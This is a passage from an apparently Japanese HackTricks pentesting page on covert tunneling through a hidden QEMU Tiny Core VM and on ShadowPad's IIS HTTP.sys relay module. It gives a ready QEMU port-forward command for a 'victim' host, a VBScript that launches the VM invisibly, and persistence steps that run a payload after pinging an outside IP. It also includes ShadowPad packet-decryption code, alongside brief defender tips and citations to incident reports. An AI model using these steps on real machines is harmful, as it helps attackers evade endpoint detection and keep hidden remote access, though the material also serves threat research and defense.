QEMU user-mode networking では、virtual network に root または administrator 権限は必要なく、`-netdev user,hostfwd=...` により host から guest への TCP、UDP、または UNIX 接続をリダイレクトできます。<sup>[[51]](#references)</sup> TrustedSec は、host に重点を置いた EDR が guest 内部の activity を見逃す可能性がある incident において、Tiny Core QEMU VM と、試行された reverse SSH tunnel について記録しています。<sup>[[1]](#references)</sup>

### 簡単な one-liner
```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 上記のコマンドは、ゲストメモリ256 MiBとqcow2ディスクイメージを使用して **Tiny Core Linux** guestを起動します。このディスクイメージはin-RAM diskではありません。
• Windows hostの**2222/tcp** portは、guest内部の**22/tcp**へ透過的にforwardされます。
• attackerの視点では、targetは単にport 2222をexposeしているだけです。そこに到達したpacketは、VM内で実行されているSSH serverによって処理されます。

### VBScriptを介してstealthily起動する

TrustedSecは、上記のincident dでVBS-driven QEMU launchesとTiny Core imagesが使用されたことを確認しました。<sup>[[1]](#references)</sup>
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
`cscript.exe //B update.vbs` でスクリプトを実行すると、ウィンドウは非表示のままになります。<sup>[[1]](#references)</sup>

### ゲスト内での永続化

d incident では、`/opt/bootlocal.sh` と `/opt/filetool.lst` を介して、ステートレスな Tiny Core guest 内で永続化する方法が説明されています。<sup>[[1]](#references)</sup>

1. ペイロードを `/opt/123.out` に配置する
2. `/opt/bootlocal.sh` に追記する:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. `home/tc` と `opt` を `/opt/filetool.lst` に追加し、シャットダウン時にペイロードが `mydata.tgz` にパックされるようにする。

### Telemetry に関する考慮事項

• ホストには、QEMU プロセス、qcow2 イメージ、ホストから forward された listener が引き続き公開されます。
• ホストのみを対象とするプロセススキャンでは guest のプロセスを検査しない場合がありますが、virtualization による evasion が保証されるわけではありません。network、QEMU、イメージの telemetry によって検出される可能性があります。<sup>[[1]](#references)[[51]](#references)</sup>

### Defender 向けのヒント

• ユーザーが書き込み可能なパスにある**予期しない QEMU/VirtualBox/KVM バイナリ**を alert する。
• `qemu-system*.exe` から発信される outbound connection を block する。
• QEMU の launch 直後に bind される、まれな listening port（2222、10022、…）を hunt する。

## `HttpAddUrl` を介した IIS/HTTP.sys relay node（ShadowPad）

Check Point は、ShadowPad の IIS module について、`HttpAddUrl` を介して URL prefix を bind することにより、侵害された perimeter web server を backdoor および relay node に変えるものだと説明しています。<sup>[[3]](#references)</sup>

同じ report では、以下にまとめた default、wildcard listener、packet decryption、relay queue、debug telemetry の詳細も説明されています。<sup>[[3]](#references)</sup>

* **Config default** – module の JSON config で値が省略されている場合、もっともらしい IIS default（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）に fallback します。これにより、benign な traffic には IIS が正しい branding で応答します。
* **Wildcard interception** – operator は URL prefix のリスト（host + path の wildcard を含む）を semicolon で区切って指定します。module は各 entry に対して `HttpAddUrl` を call するため、HTTP.sys は一致する request を malicious handler に route します。一致しない request は通常の IIS behavior に fallback します。
* **Encrypted first packet** – request body の先頭 2 byte には、custom 32-bit PRNG の seed が格納されます。それ以降の各 byte は、protocol parsing の前に生成された keystream と XOR されます:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module は 2 つの list を保持します。1 つは「servers」（upstream node）、もう 1 つは「clients」（downstream implant）です。約 30 秒以内に heartbeat が届かない entry は prune されます。両方の list が空でない場合、最初の healthy な server と最初の healthy な client を pair にし、どちらか一方が close するまで socket 間で byte を単純に pipe します。
* **Debug telemetry** – optional logging により、各 pairing の source IP、destination IP、forward された byte の合計が記録されます。investigator はこれらの breadcrumb を使い、複数の victim にまたがる ShadowPad mesh を再構築しました。

---

## Other tools to check

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Hiding in the Shadows: QEMU Virtualization を介した Covert Tunnel](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – ToolShell 以前: Storm-2603 の過去の Ransomware Operation を調査](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Stealthy Offensive Operation の Relay Network と内部動作を解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Evil-WinRM README](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Nmap Reference Guide: Firewall/IDS 制限の Bypass](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [OpenBSD ssh manual](https://man.openbsd.org/ssh)
- [7] [OpenBSD sshd_config manual](https://man.openbsd.org/sshd_config)
- [8] [OpenSSH 9.6 release notes](https://www.openssh.org/txt/release-9.6)
- [9] [sshuttle README](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: Metasploit における Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Metasploit socks_proxy module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Metasploit autoroute module documentation](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [reGeorg README](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [Chisel README](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Ligolo-ng Quickstart](https://docs.ligolo.ng/Quickstart/)
- [18] [Ligolo-ng Listeners](https://docs.ligolo.ng/Listeners/)
- [19] [Ligolo-ng Localhost](https://docs.ligolo.ng/Localhost/)
- [20] [rpivot README](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [socat manual](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [PuTTY Plink manual](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [PuTTY command-line options](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Microsoft netsh interface portproxy command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [SocksOverRDP README](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Proxifier documentation](https://www.proxifier.com/docs/win-v4/)
- [27] [Proxifier Proxification Rules](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [OpenVPN 2.7 manual](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [YARP README](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [iodine README](https://code.kryo.se/iodine/README.html)
- [32] [dnscat2 README](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [dnscat2-powershell README](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [proxychains-ng README](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: Domain Names - Implementation and Specification](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [ptunnel-ng README](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [ngrok Agent CLI](https://ngrok.com/docs/agent/cli)
- [40] [ngrok Web Inspection Interface](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [ngrok virtual hosts](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [ngrok Agent Config v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Cloudflare Tunnel overview](https://developers.cloudflare.com/tunnel/)
- [44] [Cloudflare Tunnel origin parameters](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Cloudflare Tunnel setup](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Cloudflare Tunnel configuration file](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Cloudflare Tunnel run parameters](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [frp concepts](https://gofrp.org/en/docs/concepts/)
- [49] [frp XTCP](https://gofrp.org/en/docs/features/xtcp/)
- [50] [frp SSH Tunnel Gateway](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [QEMU networking documentation](https://www.qemu.org/docs/master/system/devices/net.html)
{{#include ../banners/hacktricks-training.md}}
